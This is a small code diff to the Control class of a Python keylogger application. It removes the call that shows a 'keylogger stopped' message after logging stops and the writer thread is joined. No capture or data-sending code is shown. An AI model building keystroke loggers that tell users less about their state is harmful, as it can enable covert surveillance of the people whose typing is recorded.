@@ -44,7 +44,6 @@ class Control:
         self.__running_keylogger.stop_logging()
         self.__writer_thread.join()
         self.__running_keylogger = None
-        self.__view.show_keylogger_stopped_message()
         return True
 
     def keylogger_is_running(self) -> bool:
